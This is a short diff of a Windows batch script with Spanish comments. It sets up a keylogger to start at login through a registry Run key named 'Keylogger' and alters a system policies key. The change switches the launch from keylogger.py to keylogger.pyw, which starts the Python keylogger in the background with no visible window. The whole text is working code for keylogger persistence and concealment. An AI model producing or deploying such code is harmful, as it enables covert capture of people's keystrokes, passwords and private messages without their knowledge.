@@ -23,4 +23,4 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Keylogger /t REG_SZ /d "%~dp0autoexe.bat" /f
 
 :: Ejecuta el script
-start /B python.exe keylogger.py
+start /B python.exe keylogger.pyw
